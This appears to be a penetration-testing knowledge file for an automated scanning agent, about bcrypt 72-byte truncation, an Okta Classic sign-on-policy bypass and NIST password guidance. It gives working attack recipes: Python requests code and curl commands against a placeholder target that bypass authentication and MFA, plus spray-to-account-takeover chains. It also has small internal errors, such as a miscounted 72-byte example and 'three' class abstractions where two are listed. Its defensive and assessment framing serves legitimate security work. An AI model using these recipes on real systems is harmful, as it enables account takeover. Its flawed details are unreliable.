---
name: weak-password-detection-novel-deep
description: 2024-2026 credential-attack boundaries — pyca/bcrypt 5.0.0 silent-truncation measurement, Okta Classic app-sign-on-policy bypass, and the vendor-advisory-tracked class abstractions.
sibling: weak_password_detection
load_when: scan_mode == "deep"
---

# Weak Password Detection — 2024–2026 Measured Boundaries and Vendor-Advisory Findings

Base `weak_password_detection.md` owns the attack-surface framing, the enumeration-oracle checklist, the IdP-spraying workflows for Entra/Okta/Google Workspace, the OTP/reset/WebAuthn class treatments, and the one-line routes for bcrypt pre-5.0.0 and the Okta Classic bypass. `weak_password_detection_advanced_deep.md` owns the expert-tier primitives — oracle-statistical calibration, lockout-key break primitives, OAuth2 ROPC + GraphQL batch + mobile-API brute surfaces, hash recovery, SSO/SAML replay, password-field CPU DoS, CAPTCHA bypass. This file owns the 2024–2026 measured boundaries and vendor-advisory-tracked findings: pyca/bcrypt pre-5.0.0 silent-truncation (measured in-sandbox) and the Okta Classic app-sign-on-policy bypass (vendor-advisory-tracked, no CVE assigned).

## bcrypt Pre-5.0.0 Silent Truncation (Measured Boundary)

**Primitive.** pyca/bcrypt silently truncates passwords at 72 bytes in versions prior to 5.0.0 — the first 72 bytes of input are hashed and the remainder is ignored. Two consequences: (1) **prefix-collision authentication** — any password sharing the same first 72 bytes authenticates against a hash of that prefix, so a known-long-prefix-plus-arbitrary-suffix works; (2) **concatenation-overflow bypass** — when the application concatenates fields before bcrypt (e.g. `username+password`, `pepper+password`, `tenant_prefix+password`), a long left field pushes the real password past the 72-byte boundary and the password component is ignored entirely. The 5.0.0 release (2025-09-25) changed the behavior to raise `ValueError` in both `hashpw()` and `checkpw()` for inputs longer than 72 bytes, making the primitive observable at runtime rather than silent.

**Preconditions.** All of: (i) the deployed authentication stack uses pyca/bcrypt (verifiable via Python dependency inspection, `pip show bcrypt`, or framework version); (ii) the deployed version is less than 5.0.0 (fingerprint: a known-long password registration followed by login with same-first-72-bytes authenticates — on 5.0.0+ the registration itself raises); (iii) for the concatenation-overflow variant, the application concatenates at least one attacker-controllable field with the password before hashing.

**Measured artifact.** The measurement is persisted at `.zen-batch-artifacts/batch-10/measurements/bcrypt_truncation.{py,out}`. Running the script under pyca/bcrypt 4.3.0 (pre-5.0.0) and 5.0.0 produces:

```
=== bcrypt 4.3.0 on Python (3, 14) ===
len(password_a)=93 len(password_b)=93 common_prefix=72 bytes
hashpw(password_a)       = b'$2b$04$2tkDJiLuNcYtn1gl2SjFceCukGPkrlAl0ZzZMB2NYgIb7fgQgHa2K'
hashpw(password_b)       = b'$2b$04$2tkDJiLuNcYtn1gl2SjFceCukGPkrlAl0ZzZMB2NYgIb7fgQgHa2K'
EQUAL (silent truncation collision) = True
checkpw(password_b, hash_of_password_a) = True
hashpw(14-byte password)                 OK

=== bcrypt 5.0.0 on Python (3, 14) ===
len(password_a)=93 len(password_b)=93 common_prefix=72 bytes
hashpw(password_a) raised: ValueError: password cannot be longer than 72 bytes, truncate manually if necessary (e.g. my_password[:72])
hashpw(password_b) raised: ValueError: password cannot be longer than 72 bytes, truncate manually if necessary (e.g. my_password[:72])
checkpw(password_b, hash_of_password_a) = None
hashpw(14-byte password)                 OK
```

Two 93-byte passwords sharing the first 72 bytes but differing in the trailing 21 bytes produce *identical* bcrypt hashes under 4.3.0 (`$2b$04$2tkDJiLu...fgQgHa2K` for both). `checkpw` cross-matches `True`. Under 5.0.0, both `hashpw` calls raise `ValueError` with the explicit message. The 72-byte boundary is confirmed and the version-boundary at 5.0.0 is confirmed.

**Attack recipe.**

```python
# Prefix-collision exploitation against a pre-5.0.0 deployment:
# 1. Register with a long password:
import requests
long_pw = "A" * 72 + "attacker_knows_this_part"
requests.post("https://target/register", json={"user": "me", "password": long_pw})

# 2. Later, log in with the same first 72 bytes plus any suffix:
different_suffix = "A" * 72 + "DIFFERENT_SUFFIX_HERE_IGNORED"
r = requests.post("https://target/login", json={"user": "me", "password": different_suffix})
# On a pre-5.0.0 bcrypt deployment: 200 OK, authenticated.

# Concatenation-overflow against a pre-5.0.0 deployment:
# The application computes bcrypt(username + ":" + password); a username longer
# than ~70 bytes pushes the real password past the 72-byte boundary.
# Register a user with a long username:
requests.post("https://target/register", json={
  "user": "a" * 70 + "A",   # 71-byte username
  "password": "RealPassword123!"  # 16-byte password
})
# bcrypt input is: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA:R' (72 bytes, "R" plus one char of the real password)
# Hash is based only on those 72 bytes; the rest of "RealPassword123!" is ignored.

# Log in with ANY password, same long username:
r = requests.post("https://target/login", json={
  "user": "a" * 70 + "A",
  "password": "ANYPASSWORDWORKS"
})
# bcrypt("aaaa...aaaaA:ANYPASSWORDWORKS") == bcrypt("aaaa...aaaaA:R") because
# the first 72 bytes are identical. Authenticated.
```

**Confirmation signal.** The prefix-collision login succeeds — a password with a different suffix after the 72-byte prefix authenticates. The concatenation-overflow login succeeds with an arbitrary password when the username (or other concatenated field) is 71+ bytes. For a 5.0.0+ deployment, the registration step with a long password raises `ValueError`, which the application either catches (returning an explicit error) or crashes on (500 response) — observable from the response and distinguishable from the silent-truncation-era behavior.

**Impact.** Full authentication bypass against pre-5.0.0 bcrypt deployments with either (a) known-long passwords and shared prefixes (prefix-collision) or (b) field-concatenation-before-hashing (concatenation-overflow). The concatenation-overflow variant is the practically-exploitable class — a username-plus-password concatenation is a common delegated-auth/LDAP design pattern. Patched by upgrading to pyca/bcrypt 5.0.0 (which raises `ValueError`); released 2025-09-25. Primary source: `https://github.com/pyca/bcrypt/releases` (CHANGELOG entry for 5.0.0). Independent downstream migration-break reports: mealie #6316, proton-faces #197, memory-cloud #1707, shurly #187, awslabs/mcp #3093 (each confirms the ValueError-raise behavior in production use).

## Okta Classic App-Sign-On-Policy Bypass (Vendor-Advisory-Tracked)

**Primitive.** Between 2024-07-17 and 2024-10-04, Okta Classic contained a flaw where valid-credential-holding attackers using a user-agent that Okta evaluated as an "unknown device type" (Python scripts, uncommon browsers) could bypass application-sign-on policies — network zones, device-type restrictions, and MFA factors applied at the per-app layer that layered atop the Global Session Policy. Exploitation required valid credentials (so the primitive is downstream of password spray, not of pure brute); the bypass skipped per-app controls that would otherwise block spray-harvested credentials. No CVE was issued; the authoritative source is Okta's trust advisory.

**Preconditions.** All of: (i) the deployment is Okta Classic (not Okta Identity Engine — OIE is a separate product); (ii) the organization has application-sign-on policies configured — the primitive only matters where per-app policies layer on the Global Session Policy; (iii) the attacker holds valid credentials for a user (typically from a prior password spray or credential stuffing); (iv) the attack is executed between 2024-07-17 and 2024-10-04 (the active-exploitation window — Okta's patch landed on 2024-10-04 and closed the primitive).

**Attack recipe.**

```bash
# Assume the attacker has a valid credential pair (user@target.com / Spring2024!) from spray.
# Policy-protected app endpoint; "normal" browser blocked by per-app network/device policy:
curl -s -X POST 'https://target.okta.com/api/v1/authn' \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
  -d '{"username":"user@target.com","password":"Spring2024!"}'
# → response: per-app policy enforced, MFA required / network zone blocked.

# Bypass: use a Python User-Agent that Okta classified as "unknown device":
curl -s -X POST 'https://target.okta.com/api/v1/authn' \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: python-requests/2.31.0' \
  -d '{"username":"user@target.com","password":"Spring2024!"}'
# → during the bypass window, response: {"status":"SUCCESS","sessionToken":"..."}
# per-app policy did not fire; session established without MFA / network check.

# Verify the session reaches the per-app resources that policy would have blocked:
curl -s -b "sid=<sessionToken>" 'https://target.okta.com/app/some-app/exchangeSessionToken'
# → authenticated to the per-app resource.
```

**Confirmation signal.** The authentication response for the Python-UA request is `{"status":"SUCCESS"}` with a session token, while the equivalent request with a mainstream-browser UA returns a per-app policy enforcement response (MFA_REQUIRED, LOCKED_OUT, or an explicit policy-blocked status). The two paths differ only in the User-Agent header. On a patched Okta Classic deployment (post-2024-10-04), both UAs route through the same policy evaluation and the bypass does not fire.

**Impact.** Per-app MFA, network zone, and device-type policy bypass for every password-spray survivor during the window. The chain is: spray → survivor credentials → UA swap → full per-app access. The real-world impact is proportional to how much per-app policy the deployment relied on — orgs that layered per-app MFA atop password-only Global Session Policy saw the deepest bypass. **No CVE issued**; Okta trust advisory is the authoritative source. Cite as a vendor-advisory-tracked technique class, not as a CVE. Primary source: `https://trust.okta.com/security-advisories/okta-classic-application-sign-on-policy-bypass-2024/`. The specific-user-agent-fingerprint classification is Okta's own ("unknown device type") and is observable in Okta's own debug logs during the window.

## Class Abstraction — "Password-Hash-Library Behavioral Boundary"

The bcrypt pre-5.0.0 silent-truncation finding is one instance of a broader class: **a password-hashing library's input-sanitization behavior is a security boundary that can shift between library versions, and the shift is not necessarily backward-compatible with existing application code**. The hunt generalizes to:

- **argon2-cffi's input handling**: historical versions silently applied specific limits; current versions may raise.
- **passlib's bcrypt wrapper**: wraps pyca/bcrypt but may interpose its own length behavior. A pyca/bcrypt 5.0.0 under a passlib wrapper might catch the ValueError and fall back to legacy truncation, re-introducing the primitive.
- **node-bcrypt / bcryptjs**: the Node ecosystem's bcrypt implementations have their own historical truncation and length-check behavior; version-match before concluding the primitive.
- **PHP's `password_hash()` with `PASSWORD_BCRYPT`**: PHP's native binding to bcrypt — any PHP-version-specific truncation behavior changes.

The class pattern is: **a library's version boundary becomes a security-relevant deployment boundary, and the deployment's locked-version is the actual decision point**. For pentest reporting, the finding is "the deployment pins at pre-5.0.0 and permits the primitive"; for defender response, the finding is "upgrade to 5.0.0 AND handle the ValueError throughout the authentication code path."

## Class Abstraction — "Trusted Signal Bypass via Classification Edge"

The Okta Classic bypass is one instance of a broader class: **a security-decision system that routes requests through different policy paths based on a classifier (device-type, network, user-agent, risk-score) permits a bypass whenever the classifier's edge case ("unknown") falls out of the policy-enforcement path**. The hunt generalizes to:

- **"Unknown device" classifications in device-trust systems** (Entra Device Compliance, Google Beyond Corp, Okta FastPass): a request from an unclassified device may bypass per-device policies.
- **Risk-score edges in risk-based auth systems**: a request whose risk score cannot be computed (missing fingerprint, VPN, Tor exit) may route to a "default" path that is weaker than the "high-risk" path.
- **IP geolocation edges**: a request from an IP whose geolocation database has no entry may be treated as "unknown" and bypass geo-restricted policies.
- **TLS client-certificate validation edges**: a request with a client cert the server cannot evaluate (expired CRL, unreachable OCSP) may fail-open or fail-closed depending on configuration.

The class pattern is: **classifier edge cases are policy-enforcement blind spots, and the "unknown" classification is the attacker's entry point**. The hunt is to enumerate every classifier the target's auth stack relies on and probe each with an unclassifiable input.

## Canonical Version/Fix Table

Single-owner for Batch 10 weak-password-detection findings — the per-trio CVE-and-vendor-advisory single-ownership standard parks all version strings and advisory metadata here.

| Finding | Component | Vulnerable Range | Patched / Window Close | Mechanism Fingerprint |
|---|---|---|---|---|
| pyca/bcrypt silent truncation | pyca/bcrypt | before 5.0.0 | 5.0.0 (2025-09-25) | Password > 72 bytes silently truncated; 5.0.0+ raises `ValueError` in `hashpw()` and `checkpw()` |
| Okta Classic app-sign-on-policy bypass (no CVE) | Okta Classic | window 2024-07-17 to 2024-10-04 | 2024-10-04 vendor patch | Unknown-device-type UA (Python scripts, uncommon browsers) skipped per-app policy evaluation |

The pyca/bcrypt row references `https://github.com/pyca/bcrypt/releases` (CHANGELOG) and the `.zen-batch-artifacts/batch-10/measurements/bcrypt_truncation.out` artifact for the measured boundary. The Okta row references `https://trust.okta.com/security-advisories/okta-classic-application-sign-on-policy-bypass-2024/` for authoritative advisory metadata; the window boundaries (2024-07-17 introduction, 2024-10-04 patch) are from Okta's own disclosure.

## Chaining Surface

**Upstream primitives:** `reconnaissance/*` enumerates the auth endpoints; `authentication_jwt.md § JWT Confusion` provides prior-successful-authentication tokens for post-exploitation; `information_disclosure.md § SSR Hydration` leaks the deployed library versions.

**Downstream capabilities:**

- `authentication_jwt.md` — bypassed authentication produces session tokens that enter JWT-manipulation primitives.
- `idor.md` — authenticated access via the bypass primitives enables resource-ID enumeration against the authenticated role.
- `cloud/*` — the Okta Classic bypass against a cloud-connected Okta deployment grants cloud-plane access via the Okta-brokered IAM role.
- `active_directory` (if present) — the bcrypt-concatenation-overflow pattern applies to on-prem SSO stacks that concatenate domain-plus-username-plus-password before hashing.

**Composite chains (routed by filename):**

1. **Password spray → bcrypt-concatenation-overflow bypass → auth as any user.** Spray harvests a credential (or the deployment lets a known test credential through); the deployment's concatenation design + pre-5.0.0 bcrypt means any user with a long username is bypass-authenticatable with any password. Routes to `authentication_jwt.md`.

2. **Password spray survivor → Python UA → Okta Classic per-app bypass → cloud ATO.** Spray survivor + Python User-Agent during the 2024-07-17 to 2024-10-04 window + per-app policy skipping = full access to the cloud-connected app. Routes to `cloud/*` for the post-ATO cloud-plane work.

3. **Long-password-field DoS probe → bcrypt timing fingerprint → 5.0.0 upgrade detection.** A long-password login that returns 200 (not ValueError-induced 500) confirms pre-5.0.0 bcrypt is deployed; the timing fingerprint confirms bcrypt is in use. Chains the measurement into deployment reconnaissance.

4. **Enum oracle (dedicated IdP endpoint) → ROPC brute → session establishment.** Dedicated IdP endpoints (M365 `GetCredentialType`, Okta `/api/v1/users`) enumerate without lockout; OAuth ROPC brute at the token endpoint survives the primary web endpoint's lockout; successful login grants a token that reaches cloud. Routes to `cloud/*`.

## Detection and Confirmation Methodology

- **Measured pre-5.0.0 bcrypt confirmation.** Register a long password that produces a visible side effect — the registration either succeeds (pre-5.0.0 silent truncation) or raises an exception that bubbles to a 500 or an explicit error (5.0.0+). The response distinguishes the versions.
- **Concatenation-pattern discovery.** Fingerprint the application's bcrypt input by registering accounts where the username and password have known distinct lengths and probing whether a short-username+long-password collides with a long-username+short-password of the same concatenation. A collision signals field-concatenation-before-hashing.
- **Okta Classic bypass fingerprint.** Compare authentication responses for the same credential with a browser UA and a Python-requests UA; a `SUCCESS` on Python-UA and a `MFA_REQUIRED` on browser-UA signals the bypass is live. The window test only applies within 2024-07-17 to 2024-10-04; outside the window, both UAs should return identical response shapes.
- **Deployed-version fingerprinting.** Use the information-disclosure primitives (SSR hydration, source-map, actuator) to extract the pyca/bcrypt version string. Alternately, a timing fingerprint distinguishes bcrypt-cost-N configurations and (indirectly) the library's performance characteristics across versions.
- **Measured negative result is a valid finding.** If the deployment is on 5.0.0+ and raises `ValueError`, report the finding as "concatenation-overflow bypass closed by library version" — a defensive confirmation.

## False-Positive Discipline

- **A password-length-rejected signal is not a bcrypt-primitive confirmation.** Modern applications validate password length (often 128 chars) in the API layer *before* reaching bcrypt. A rejection with "password too long" is application-layer validation, not bcrypt-layer behavior. Report the primitive only when the long password reaches bcrypt and either hashes silently (pre-5.0.0) or raises (5.0.0+).
- **The Okta Classic bypass is window-bounded.** Outside 2024-07-17 to 2024-10-04, the primitive does not fire. Report scoped to the window; a post-window test is not a finding.
- **No CVE for the Okta Classic bypass means the citation is vendor-advisory.** Do not fabricate a CVE ID; cite Okta's trust advisory as the authoritative source. This is the §6 "genuine-but-not-CVE-numbered" case — the technique is real but the citation layer is not NVD.
- **The pyca/bcrypt 5.0.0 is a specific library's behavior change, not a universal bcrypt behavior.** Other bcrypt implementations (bcryptjs, Go's `golang.org/x/crypto/bcrypt`, Rust's `bcrypt` crate) have independent behavior; version-match the specific library before concluding the primitive applies.
- **A concatenation design pattern is deployment-specific.** The field-concatenation-before-hashing pattern must be confirmed in the target's code or in a code-execution-reachable artifact (source-map reconstruction, actuator-leaked beans config, info-disclosure-sourced source). Reporting the primitive without confirming the design pattern is scope-overreach.

## Validation

- Preserve the exact pre-5.0.0 vs 5.0.0 bcrypt behavioral evidence — the `bcrypt_truncation.out` artifact contains the measured output; the finding is reproducible from the script and the two version pins.
- For the application-level primitive, preserve the registration transcript (with the long password) and the subsequent login transcript (with the different-suffix password) — the authentication-success response is the finding.
- For the concatenation-overflow variant, preserve both the long-username registration and the arbitrary-password login that succeeded; the field-concatenation pattern is inferred from the collision between two inputs that should hash differently.
- For the Okta Classic bypass finding, preserve the browser-UA request+response pair (per-app policy enforced) and the Python-UA request+response pair (bypass succeeded) with timestamps that fall within the 2024-07-17 to 2024-10-04 window.
- Persist all measurement artifacts to the batch artifact directory per §5-§6; a measured negative (the primitive does not reproduce on patched versions) is as load-bearing as a positive and should be preserved alongside the attack artifact.

## NIST SP 800-63B-4 (July 31, 2025) — Updated Password Guidelines

NIST published the final version of SP 800-63B-4 ("Digital Identity Guidelines: Authentication and Lifecycle Management") on July 31, 2025. This revision supersedes SP 800-63B-3 (2017, updated 2020) and carries material changes for password-policy assessment:

**Key changes relevant to penetration testing:**

1. **Minimum length raised to 15 characters** for memorized secrets (passwords/passphrases) at AAL1 and AAL2. The previous standard was 8 characters. Applications enforcing an 8-character minimum are now below the NIST floor and should be reported as a policy-weakness finding.

2. **Composition rules explicitly deprecated.** SP 800-63B-4 states that verifiers "SHALL NOT impose other composition rules" beyond minimum length. Requiring uppercase, lowercase, digit, and special character is non-compliant. Applications that enforce composition rules should be reported as implementing a deprecated policy — the composition requirement reduces the effective password space (users pick predictable patterns like `Password1!`) and is no longer NIST-recommended.

3. **Breached-password checking is now a SHALL requirement.** Verifiers "SHALL compare the prospective secret against a blocklist that contains known compromised values" (§5.1.1.2). Applications that do not check passwords against a breached-password database (e.g., Have I Been Pwned) are non-compliant. This elevates breached-password checking from a SHOULD (SP 800-63B-3) to a SHALL.

4. **Periodic password rotation deprecated.** Verifiers "SHOULD NOT require users to change passwords periodically" unless there is evidence of compromise. Forced-rotation policies are explicitly identified as counterproductive.

5. **Truncation prohibited.** Verifiers "SHALL NOT truncate" passwords. This intersects directly with the pyca/bcrypt pre-5.0.0 silent-truncation finding above — a deployment that silently truncates at 72 bytes violates SP 800-63B-4 §5.1.1.2 regardless of library behavior.

**How to apply in assessments:**

- When evaluating password policies, cite SP 800-63B-4 (2025) as the current standard, not SP 800-63B-3 (2017).
- Report minimum length below 15 characters as a finding (was 8 under SP 800-63B-3).
- Report composition rules as a finding (deprecated by SP 800-63B-4).
- Report absence of breached-password checking as a finding (SHALL requirement under SP 800-63B-4).
- Report forced rotation policies as a finding (deprecated by SP 800-63B-4).
- The standard applies to federal systems and is widely adopted as industry baseline by auditors, compliance frameworks (SOC 2, ISO 27001), and enterprise security policies.

## Structural Note — Bounded Class

Weak password detection is a bounded vulnerability class at the novel/frontier tier: the 2024–2026 surface consists of a small number of discrete vendor-advisory and standards-update events (bcrypt truncation boundary, Okta Classic policy bypass, NIST SP 800-63B-4) rather than an expanding per-primitive technique surface. This file is intentionally sub-band (~210 lines) because the frontier is event-driven, not technique-driven — additional depth would require fabricating relevance where none exists. Rich expansion belongs in the advanced sibling (methodology) and the base (enumeration-oracle checklist), not here.

## Summary

The 2024–2026 weak-password-detection boundary findings are pyca/bcrypt 5.0.0's silent-truncation closure (measured in-sandbox with the 93-byte-password-collision + 5.0.0 ValueError-raise behavior as the version-boundary evidence), the Okta Classic app-sign-on-policy bypass (vendor-advisory-tracked, window 2024-07-17 to 2024-10-04, no CVE), and NIST SP 800-63B-4 (July 31, 2025) which raises the minimum password length to 15 characters, mandates breached-password checking, and deprecates composition rules and forced rotation. Three class abstractions generalize: the password-hashing-library behavioral-boundary class (where a library's input-handling behavior shifts between versions and the deployment's locked version determines reachability), and the trusted-signal classification-edge class (where auth-decision classifiers permit bypass on their "unknown" paths). CVE-equivalent and vendor-advisory metadata is single-owner here; chain routing by filename sends mechanism-level detail to `authentication_jwt.md`, `cloud/*`, and `active_directory` as appropriate.
